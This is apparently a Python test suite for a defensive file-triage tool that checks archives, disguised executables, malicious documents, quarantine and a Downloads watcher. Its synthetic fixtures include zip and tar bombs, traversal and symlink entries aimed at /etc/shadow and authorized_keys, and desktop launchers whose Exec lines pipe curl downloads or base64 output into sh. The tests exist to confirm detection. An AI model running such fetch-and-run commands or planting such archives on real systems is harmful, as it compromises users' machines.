"""Vigil Files: archive listing without extraction, disguise and document triage,
quarantine with restore, the Downloads watcher, and the page's API.

Every archive and file here is SYNTHETIC and built inside the test: zip and tar bombs
from runs of zeros, archives with ../ paths, links, device files and setuid bits, 7z
and RAR indexes written byte by byte (tests/files/builders.py), and documents from
tests/synth.py. Nothing is ever extracted, opened or run."""

import builtins
import io
import json
import os
import stat
import subprocess
import tarfile
import tempfile
import time
import unittest
import zipfile
from pathlib import Path
from unittest import mock

from vigil.core import finding
from vigil.files import listing, quarantine, triage
from vigil.files.server import App, downloads_dir
from vigil.files.watch import Watcher

from .. import synth
from . import builders
from .test_archives import raw_zip, deflate

ARCH = {"ID": "arch", "PRETTY_NAME": "Arch Linux"}
MB = 2 ** 20


def checks(rep):
    return {f["check"] for f in rep["findings"]}


def sev(rep, check):
    return next(f["severity"] for f in rep["findings"] if f["check"] == check)


class Tmp(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.d = Path(self.tmp.name)

    def write(self, name, data, mode=None):
        p = self.d / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)
        if mode is not None:
            os.chmod(p, mode)
        return p

    def zip_with(self, name, entries):
        """entries: (name, data, unix mode or None)."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            for n, data, mode in entries:
                zi = zipfile.ZipInfo(n)
                zi.compress_type = zipfile.ZIP_STORED if mode and stat.S_ISLNK(mode) else zipfile.ZIP_DEFLATED
                if mode is not None:
                    zi.external_attr = mode << 16
                    zi.create_system = 3
                z.writestr(zi, data)
        return self.write(name, buf.getvalue())

    def tar_with(self, name, members, compression="gz"):
        """members: TarInfo-like dicts {name, type, size, mode, link}."""
        p = self.d / name
        with tarfile.open(p, f"w:{compression}" if compression else "w") as tf:
            for m in members:
                ti = tarfile.TarInfo(m["name"])
                ti.type = m.get("type", tarfile.REGTYPE)
                ti.mode = m.get("mode", 0o644)
                ti.linkname = m.get("link", "")
                data = m.get("data", b"")
                ti.size = len(data) if ti.type == tarfile.REGTYPE else 0
                if ti.type in (tarfile.CHRTYPE, tarfile.BLKTYPE):
                    ti.devmajor, ti.devminor = 1, 3
                tf.addfile(ti, io.BytesIO(data) if ti.type == tarfile.REGTYPE else None)
        return p


class ZipChecks(Tmp):
    def test_zip_bomb_built_here(self):
        p = self.write("bomb.zip", raw_zip([("zeros.bin", 0, 64 * MB)], [("zeros.bin", deflate(b"\0" * 64 * MB), 64 * MB)]))
        rep = triage.inspect_path(str(p), ARCH)
        self.assertEqual(sev(rep, "archive_ratio"), "High")
        self.assertEqual(rep["verdict"], "Likely malicious")
        self.assertGreater(rep["listing"]["declared_total"] / p.stat().st_size, 1000)

    def test_overlapping_entries(self):
        comp = deflate(b"A" * 4 * MB)
        p = self.write("overlap.zip", raw_zip([(f"f{i}.txt", 0, 4 * MB) for i in range(50)], [("f0.txt", comp, 4 * MB)]))
        lst = listing.list_archive(str(p))
        self.assertEqual(len(lst["overlaps"]), 49)
        rep = triage.inspect_path(str(p), ARCH)
        # The index check and the inspector's measured check see the same trick; one of them stays.
        self.assertTrue({"archive_overlap", "inspector_overlapping_entries"} & checks(rep))
        self.assertTrue(any(f["severity"] == "High" and "overlap" in f["check"] for f in rep["findings"]))
        self.assertEqual(rep["verdict"], "Likely malicious")

    def test_entry_count_and_depth(self):
        many = [(f"d/{i}.txt", b"", None) for i in range(10_050)]
        rep = triage.inspect_path(str(self.zip_with("many.zip", many)), ARCH)
        self.assertTrue({"archive_entries", "inspector_entry_flood"} & checks(rep))
        deep = "/".join(f"d{i}" for i in range(45)) + "/x.txt"
        rep = triage.inspect_path(str(self.zip_with("deep.zip", [(deep, b"x", None)])), ARCH)
        self.assertIn("archive_depth", checks(rep))

    def test_paths_links_devices_setuid(self):
        p = self.zip_with("tricks.zip", [
            ("../../.bashrc", b"x", None), ("/etc/cron.d/x", b"x", None),
            ("link", b"/etc/shadow", stat.S_IFLNK | 0o777), ("inner", b"sub/file", stat.S_IFLNK | 0o777),
            ("tool", b"\x7fELF", stat.S_IFREG | 0o4755), ("dev", b"", stat.S_IFCHR | 0o600)])
        rep = triage.inspect_path(str(p), ARCH)
        got = checks(rep)
        for c in ("archive_traversal", "archive_absolute", "archive_link_escape", "archive_setuid", "archive_device",
                  "archive_link"):
            self.assertIn(c, got)
        for c in ("archive_traversal", "archive_absolute", "archive_link_escape", "archive_setuid", "archive_device"):
            self.assertEqual(sev(rep, c), "High", c)
        esc = next(f for f in rep["findings"] if f["check"] == "archive_link_escape")
        self.assertIn("link → /etc/shadow", esc["summary"])

    def test_duplicate_names(self):
        p = self.write("dup.zip", raw_zip([("a.txt", 0, 1), ("A.TXT", 1, 1)], [("a.txt", deflate(b"a"), 1), ("A.TXT", deflate(b"b"), 1)]))
        self.assertIn("archive_duplicates", checks(triage.inspect_path(str(p), ARCH)))

    def test_ordinary_zip_is_quiet(self):
        p = self.zip_with("photos.zip", [("photos/a.txt", b"hello " * 50, None), ("photos/b.txt", b"world " * 50, None)])
        rep = triage.inspect_path(str(p), ARCH)
        self.assertEqual(rep["verdict"], "No suspicious indicators found")
        self.assertFalse([f for f in rep["findings"] if f["severity"] in ("High", "Medium")])


class TarChecks(Tmp):
    def test_tar_formats_and_entry_types(self):
        members = [{"name": "ok.txt", "data": b"hello"}, {"name": "../escape.txt", "data": b"x"},
                   {"name": "s", "type": tarfile.SYMTYPE, "link": "../../etc/passwd"},
                   {"name": "h", "type": tarfile.LNKTYPE, "link": "/etc/shadow"},
                   {"name": "null", "type": tarfile.CHRTYPE}, {"name": "disk", "type": tarfile.BLKTYPE},
                   {"name": "pipe", "type": tarfile.FIFOTYPE}, {"name": "su", "data": b"#!/bin/sh\n", "mode": 0o4755}]
        for comp, fmt_name in (("gz", "tar.gz"), ("bz2", "tar.bz2"), ("xz", "tar.xz"), ("", "tar")):
            with self.subTest(comp or "plain"):
                p = self.tar_with(f"t.{comp or 'tar'}", members, comp)
                lst = listing.list_archive(str(p))
                self.assertEqual(lst["format"], fmt_name)
                self.assertEqual({e["type"] for e in lst["entries"]},
                                 {"file", "symlink", "hardlink", "chardev", "blockdev", "fifo"})
                rep = triage.inspect_path(str(p), ARCH)
                for c in ("archive_traversal", "archive_link_escape", "archive_device", "archive_fifo", "archive_setuid"):
                    self.assertIn(c, checks(rep), c)

    def test_tar_gz_bomb_and_the_stream_cap(self):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz", compresslevel=9) as tf:
            ti = tarfile.TarInfo("zeros.img")
            ti.size = 300 * MB

            class Zeros(io.RawIOBase):
                left = ti.size

                def readable(self):
                    return True

                def readinto(self, b):
                    n = min(len(b), self.left)
                    b[:n] = b"\0" * n
                    self.left -= n
                    return n
            tf.addfile(ti, io.BufferedReader(Zeros()))
            tf.addfile(tarfile.TarInfo("after.txt"), io.BytesIO(b""))
        p = self.write("bomb.tar.gz", buf.getvalue())
        rep = triage.inspect_path(str(p), ARCH)
        self.assertEqual(sev(rep, "archive_ratio"), "High")
        with mock.patch.object(listing, "STREAM_CAP", 50 * MB):
            lst = listing.list_archive(str(p))
        self.assertFalse(lst["complete"])
        self.assertTrue(any("Stopped reading" in n for n in lst["notes"]))
        self.assertLess(lst["unpacked_read"], 60 * MB)

    def test_zstd_without_a_decoder_is_reported(self):
        p = self.write("x.tar.zst", b"\x28\xb5\x2f\xfd" + b"\0" * 64)
        with mock.patch.object(listing, "_zstd", None):
            lst = listing.list_archive(str(p))
        self.assertFalse(lst["complete"])
        self.assertIn("Zstandard", lst["notes"][0])


class SevenZipAndRar(Tmp):
    FILES = [("docs", 0, stat.S_IFDIR | 0o755, True), ("docs/a.txt", 10, stat.S_IFREG | 0o644, False),
             ("run", 5, stat.S_IFREG | 0o4755, False), ("lnk", 0, stat.S_IFLNK | 0o777, False),
             ("../up.txt", 3, None, False)]

    def test_7z_plain_and_compressed_headers(self):
        for enc in (False, True):
            with self.subTest(encoded=enc):
                p = self.write(f"a{enc}.7z", builders.sevenzip(self.FILES, encode_header=enc))
                lst = listing.list_archive(str(p))
                self.assertEqual([e["name"] for e in lst["entries"]], [f[0] for f in self.FILES])
                self.assertEqual([e["size"] for e in lst["entries"]], [0, 10, 5, 0, 3])
                rep = triage.inspect_path(str(p), ARCH)
                for c in ("archive_traversal", "archive_setuid", "archive_link"):
                    self.assertIn(c, checks(rep))

    def test_encrypted_names(self):
        for name, data in (("e.7z", builders.sevenzip(self.FILES, encrypt_header=True)),
                           ("e.rar", builders.rar5([], encrypted=True)), ("e4.rar", builders.rar4([], encrypted=True))):
            with self.subTest(name):
                rep = triage.inspect_path(str(self.write(name, data)), ARCH)
                self.assertEqual(sev(rep, "archive_encrypted"), "Medium")
                self.assertTrue(rep["listing"]["encrypted_names"])

    def test_rar5_and_rar4(self):
        r5 = builders.rar5([("dir", 0, stat.S_IFDIR | 0o755, None, 0), ("dir/x.sh", 4, stat.S_IFREG | 0o4755, None, 0),
                            ("l", 0, stat.S_IFLNK | 0o777, "/etc/shadow", 1), ("../evil", 2, stat.S_IFREG | 0o644, None, 0),
                            ("hl", 0, stat.S_IFREG | 0o644, "../../root/.ssh/authorized_keys", 4)])
        rep = triage.inspect_path(str(self.write("a.rar", r5)), ARCH)
        for c in ("archive_traversal", "archive_setuid", "archive_link_escape"):
            self.assertIn(c, checks(rep))
        self.assertEqual(rep["listing"]["format"], "rar5")
        r4 = builders.rar4([("d", 0, stat.S_IFDIR | 0o755), ("d/s", 3, stat.S_IFREG | 0o6755), ("..\\x", 1, stat.S_IFREG | 0o644)])
        rep = triage.inspect_path(str(self.write("b.rar", r4)), ARCH)
        self.assertEqual([e["name"] for e in rep["listing"]["entries"]], ["d", "d/s", "../x"])
        for c in ("archive_traversal", "archive_setuid"):
            self.assertIn(c, checks(rep))

    def test_crafted_indexes_never_crash(self):
        for name, data in (("t.7z", b"7z\xbc\xaf\x27\x1c\x00\x04" + b"\xff" * 40), ("t.rar", b"Rar!\x1a\x07\x01\x00\xff\xff\xff"),
                           ("t4.rar", b"Rar!\x1a\x07\x00" + b"\x00\x00\x74\x00\x00\x03\x00"), ("t.zip", b"PK\x03\x04garbage")):
            with self.subTest(name):
                rep = triage.inspect_path(str(self.write(name, data)), ARCH)
                self.assertIn("verdict", rep)


class DisguiseAndDocuments(Tmp):
    def test_double_extension_and_rtl_override(self):
        pe = b"MZ" + b"\0" * 58 + b"\x40\0\0\0" + b"PE\0\0" + b"\0" * 200
        rep = triage.inspect_path(str(self.write("invoice.pdf.exe", pe)), ARCH)
        self.assertEqual(sev(rep, "inspector_disguise"), "High")
        rep = triage.inspect_path(str(self.write("photo‮gpj.exe", pe)), ARCH)
        self.assertIn("inspector_disguise", checks(rep))

    def test_program_in_downloads(self):
        dl = self.d / "Downloads"
        p = self.write("Downloads/update", b"\x7fELF\x02\x01\x01" + b"\0" * 100, mode=0o755)
        rep = triage.inspect_path(str(p), ARCH, downloads=str(dl))
        self.assertEqual(sev(rep, "downloads_program"), "Medium")
        rep = triage.inspect_path(str(p), ARCH, downloads=str(self.d / "elsewhere"))
        self.assertNotIn("downloads_program", checks(rep))

    def test_desktop_launchers(self):
        bad = b"[Desktop Entry]\nType=Application\nName=Invoice.pdf\nExec=sh -c \"curl -s https://198.51.100.3/x | sh\"\n"
        rep = triage.inspect_path(str(self.write("Downloads/Invoice.desktop", bad)), ARCH, downloads=str(self.d / "Downloads"))
        self.assertEqual(sev(rep, "desktop_command"), "High")
        self.assertEqual(sev(rep, "desktop_disguise"), "High")
        plain = b"[Desktop Entry]\nType=Application\nName=Editor\nExec=gedit %U\n"
        rep = triage.inspect_path(str(self.write("Downloads/editor.desktop", plain)), ARCH, downloads=str(self.d / "Downloads"))
        self.assertEqual(sev(rep, "desktop_download"), "Medium")
        self.assertNotIn("desktop_command", checks(rep))

    def test_pdf_and_office_triage(self):
        cases = {"auto.pdf": (synth.pdf_autorun_js(), {"inspector_pdf_javascript", "inspector_pdf_autorun"}),
                 "launch.pdf": (synth.pdf_launch_embedded(), {"inspector_pdf_launch", "inspector_pdf_embedded"}),
                 "dropper.docm": (synth.docm_dropper(), {"inspector_macro_autoexec"}),
                 "template.docx": (synth.docx_remote_template(), {"inspector_remote_template"})}
        for name, (data, want) in cases.items():
            with self.subTest(name):
                rep = triage.inspect_path(str(self.write(name, data)), ARCH)
                self.assertTrue(want <= checks(rep), (want, checks(rep)))
                self.assertIn(rep["verdict"], ("Likely malicious", "Suspicious"))
        rep = triage.inspect_path(str(self.write("doc.docx", synth.ooxml(synth.word_parts()))), ARCH)
        self.assertEqual(rep["verdict"], "No suspicious indicators found")

    def test_every_finding_follows_the_suite_format(self):
        self.write("x.zip", raw_zip([("../a", 0, 1)], [("../a", deflate(b"a"), 1)]))
        self.write("y.pdf", synth.pdf_autorun_js())
        self.write("z.desktop", b"[Desktop Entry]\nName=a.pdf\nExec=bash -c 'base64 -d x | sh'\n")
        for p in self.d.iterdir():
            for f in triage.inspect_path(str(p), ARCH)["findings"]:
                with self.subTest(file=p.name, check=f["check"]):
                    self.assertEqual(finding.problems(f), [])
                    self.assertFalse(f["title"].endswith("…"), f["title"])
                    self.assertEqual(f["source"]["tool"], "files")

    def test_preview_is_plain_text_only(self):
        self.assertEqual(triage.preview(str(self.write("a.txt", b"hello\n")))["kind"], "text")
        self.assertEqual(triage.preview(str(self.write("a.png", b"\x89PNG\r\n\x1a\n" + b"\0" * 20)))["kind"], "none")
        big = triage.preview(str(self.write("big.txt", b"a" * 200_000)))
        self.assertTrue(big["truncated"])
        self.assertEqual(len(big["text"]), 64 * 1024)

    def test_links_are_not_followed(self):
        os.symlink("/etc/passwd", self.d / "pw")
        rep = triage.inspect_path(str(self.d / "pw"), ARCH)
        self.assertEqual(checks(rep), {"is_link"})


class NeverExtractsOrRuns(Tmp):
    def test_inspection_writes_nothing_and_runs_nothing(self):
        self.zip_with("a.zip", [("../../x", b"x", None), ("l", b"/etc/passwd", stat.S_IFLNK | 0o777)])
        self.tar_with("b.tar.gz", [{"name": "../y", "data": b"y"}, {"name": "dev", "type": tarfile.CHRTYPE}])
        self.write("c.7z", builders.sevenzip(SevenZipAndRar.FILES, encode_header=True))
        self.write("d.rar", builders.rar5([("../z", 1, stat.S_IFREG | 0o644, None, 0)]))
        self.write("e.docm", synth.docm_dropper())
        inside = {p: p.read_bytes() for p in self.d.iterdir()}
        real_open = builtins.open

        def guarded(file, mode="r", *a, **k):
            if any(c in mode for c in "wax+"):
                raise AssertionError(f"tried to write {file}")
            return real_open(file, mode, *a, **k)
        boom = AssertionError("tried to run something")
        with mock.patch("builtins.open", guarded), mock.patch.object(subprocess, "run", side_effect=boom), \
                mock.patch.object(subprocess, "Popen", side_effect=boom), mock.patch.object(os, "system", side_effect=boom), \
                mock.patch.object(zipfile.ZipFile, "extractall", side_effect=boom), \
                mock.patch.object(tarfile.TarFile, "extractall", side_effect=boom):
            for p in list(self.d.iterdir()):
                triage.inspect_path(str(p), ARCH)
        self.assertEqual({p: p.read_bytes() for p in self.d.iterdir()}, inside)
        self.assertFalse((self.d.parent / "x").exists())
        self.assertFalse((self.d.parent / "y").exists())


class QuarantineTests(Tmp):
    def test_put_and_restore_round_trip(self):
        p = self.write("Downloads/evil.sh", b"#!/bin/sh\necho hi\n", mode=0o755)
        os.utime(p, (1_000_000, 1_000_000))
        q = quarantine.Quarantine(self.d / "q")
        rec = q.put(str(p), "test")
        self.assertFalse(p.exists())
        item = self.d / "q" / rec["id"] / "item"
        self.assertEqual(stat.S_IMODE(item.stat().st_mode), 0)
        self.assertEqual(stat.S_IMODE((self.d / "q").stat().st_mode), 0o700)
        self.assertEqual([r["id"] for r in q.items()], [rec["id"]])
        back = q.restore(rec["id"])
        self.assertEqual(back["restored_to"], str(p))
        self.assertEqual(p.read_bytes(), b"#!/bin/sh\necho hi\n")
        self.assertEqual(stat.S_IMODE(p.stat().st_mode), 0o755)
        self.assertEqual(p.stat().st_mtime, 1_000_000)
        self.assertEqual(q.items(), [])

    def test_refusals(self):
        q = quarantine.Quarantine(self.d / "q")
        p = self.write("a.bin", b"one")
        with self.assertRaises(quarantine.QuarantineError):
            q.put(str(p), "", report_sha256="0" * 64)   # the file changed since it was inspected
        rec = q.put(str(p))
        self.write("a.bin", b"something new arrived here")
        with self.assertRaises(quarantine.QuarantineError):
            q.restore(rec["id"])                         # never overwrite
        other = q.restore(rec["id"], to=str(self.d / "restored.bin"))
        self.assertEqual(Path(other["restored_to"]).read_bytes(), b"one")
        with self.assertRaises(quarantine.QuarantineError):
            q.record("../etc")
        os.symlink("/etc/passwd", self.d / "link")
        with self.assertRaises(quarantine.QuarantineError):
            q.put(str(self.d / "link"))

    def test_delete_and_noexec_detection(self):
        q = quarantine.Quarantine(self.d / "q")
        rec = q.put(str(self.write("x", b"x")))
        q.delete(rec["id"])
        self.assertEqual(q.items(), [])
        mi = self.write("mountinfo", f"22 1 0:1 / / rw,relatime - ext4 /dev/x rw\n"
                                     f"30 22 0:2 / {self.d} rw,nosuid,nodev,noexec - tmpfs tmpfs rw\n".encode())
        m = quarantine.mount_options(str(self.d / "q"), str(mi))
        self.assertTrue(m["noexec"])
        self.assertEqual(m["mount"], str(self.d))


class WatcherTests(Tmp):
    def test_only_new_settled_files_are_checked(self):
        dl = self.d / "dl"
        dl.mkdir()
        (dl / "old.txt").write_text("already here")
        seen = []
        w = Watcher(str(dl), lambda p: seen.append(p) or {"verdict": "Suspicious", "findings": [{"title": "t"}],
                                                          "counts": {"Medium": 1}}, interval=0.01)
        (dl / "new.zip.part").write_bytes(b"partial")
        (dl / "new.sh").write_bytes(b"#!/bin/sh\n")
        self.assertEqual(w.tick(), [])                  # seen once: may still be downloading
        made = w.tick()                                 # unchanged: arrived
        self.assertEqual([os.path.basename(e["path"]) for e in made], ["new.sh"])
        self.assertEqual(made[0]["verdict"], "Suspicious")
        self.assertEqual(w.tick(), [])                  # not again
        (dl / "new.sh").write_bytes(b"#!/bin/sh\necho changed\n")
        w.tick()
        self.assertEqual(len(w.tick()), 1)              # a changed file is checked again
        self.assertEqual(seen, [str(dl / "new.sh")] * 2)
        self.assertEqual(len(w.since(0)), 2)

    def test_a_failing_check_does_not_stop_watching(self):
        dl = self.d / "dl"
        dl.mkdir()
        w = Watcher(str(dl), lambda p: 1 / 0)
        (dl / "x").write_bytes(b"x")
        w.tick()
        ev = w.tick()
        self.assertIn("ZeroDivisionError", ev[0]["error"])


class ServerTests(Tmp):
    def setUp(self):
        super().setUp()
        home = self.d / "home"
        (home / ".config").mkdir(parents=True)
        (home / "Dl").mkdir()
        (home / ".config/user-dirs.dirs").write_text('XDG_DOWNLOAD_DIR="$HOME/Dl"\n')
        self.home = home
        self.app = App(self.d / "data", os_release_path=str(Path(__file__).parent.parent / "fixtures/os-release/fedora"),
                       home=str(home))
        self.addCleanup(self.app.close)

    def post(self, route, body):
        return self.app.routes()[("POST", route)]({}, json.dumps(body).encode(), {})

    def get(self, route, q=None):
        return self.app.routes()[("GET", route)](q or {})

    def test_downloads_dir_from_user_dirs(self):
        self.assertEqual(downloads_dir(str(self.home)), str(self.home / "Dl"))
        self.assertEqual(downloads_dir(str(self.d)), str(self.d / "Downloads"))

    def test_browse_inspect_quarantine_restore(self):
        (self.home / "Dl/invoice.pdf.exe").write_bytes(b"MZ" + b"\0" * 58 + b"\x40\0\0\0PE\0\0" + b"\0" * 64)
        (self.home / "Dl/notes.txt").write_text("hello")
        b = self.get("/api/browse")
        flags = {e["name"]: e["flag"] for e in b["entries"]}
        self.assertEqual(flags["invoice.pdf.exe"]["severity"], "High")
        self.assertIsNone(flags["notes.txt"])
        rep = self.post("/api/inspect", {"path": str(self.home / "Dl/invoice.pdf.exe")})
        self.assertEqual(rep["verdict"], "Likely malicious")
        self.assertEqual(rep["findings"][0]["fixes"]["distro"]["family"], "fedora")
        lines = (self.d / "data/findings.jsonl").read_text().splitlines()
        self.assertTrue(lines and all(json.loads(x)["tool"] == "files" for x in lines))
        rec = self.post("/api/quarantine", {"path": rep["path"], "sha256": rep["hashes"]["sha256"]})
        self.assertFalse(Path(rep["path"]).exists())
        self.assertEqual(len(self.get("/api/quarantine")["items"]), 1)
        self.post("/api/restore", {"id": rec["id"]})
        self.assertTrue(Path(rep["path"]).exists())

    def test_lookup_is_opt_in_and_sends_only_the_hash(self):
        sent = []

        def fake(url, headers=None, data=None, timeout=30):
            sent.append((url, headers, data))
            return 200, {"query_status": "ok", "data": [{"signature": "TestFamily", "tags": []}]}
        self.app.requester = fake
        sha = "a" * 64
        from vigil.core.web import BadRequest
        with self.assertRaises(BadRequest):
            self.post("/api/lookup", {"sha256": sha, "service": "malwarebazaar"})   # no key yet
        self.assertEqual(sent, [])
        self.post("/api/keys", {"service": "malwarebazaar", "key": "k123"})
        r = self.post("/api/lookup", {"sha256": sha, "service": "malwarebazaar"})
        self.assertEqual(r["findings"][0]["severity"], "High")
        self.assertEqual(sent[0][2], {"query": "get_info", "hash": sha})

    def test_watch_on_and_off(self):
        s = self.post("/api/watch", {"on": True, "interval": 0.05})
        self.assertTrue(s["watching"])
        self.assertEqual(s["watch_folder"], str(self.home / "Dl"))
        (self.home / "Dl/new.desktop").write_text("[Desktop Entry]\nName=x.pdf\nExec=sh -c 'curl x|sh'\n")
        deadline = time.time() + 5
        events = []
        while time.time() < deadline and not events:
            time.sleep(0.05)
            events = self.get("/api/watch/events", {"since": "0"})["events"]
        self.assertEqual(events[0]["verdict"], "Likely malicious")
        self.assertFalse(self.post("/api/watch", {"on": False})["watching"])


class PageTests(Tmp):
    def test_page_and_shared_kit_are_served(self):
        from vigil.files.server import make_server
        from ..helpers import page_check
        app = App(self.d / "data")
        self.addCleanup(app.close)
        page_check(self, make_server, app, [("/", b"<title>Vigil Files</title>"), ("/static/files-app.js", b"renderReport"),
                                            ("/static/findings.js", b"findingCard")])


if __name__ == "__main__":
    unittest.main()
